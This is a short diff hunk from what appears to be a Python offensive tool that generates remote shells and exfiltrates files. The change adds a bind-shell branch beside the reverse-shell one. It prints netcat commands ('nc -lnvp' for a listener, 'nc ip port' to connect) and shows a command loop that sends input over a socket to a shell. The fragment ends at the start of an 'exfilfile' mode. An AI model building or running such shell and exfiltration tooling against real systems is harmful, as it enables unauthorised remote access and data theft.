@@ -57,8 +57,10 @@ if args.command == "genshell":
 					conn.send(cmd.encode("utf-8"))
 					time.sleep(1)
 					sys.stdout.write("\033[A" + data.split("\n")[-1])
-	else:
+	elif args.shell == "rev":
 		print(f"on your machine run the following:\n\tnc -lnvp {args.port}")
+	else:
+		print(f"on your machine run the following:\n\tnc {args.ip} {args.port}")
 	
 if args.command == "exfilfile":
 	if args.method == "postflask":
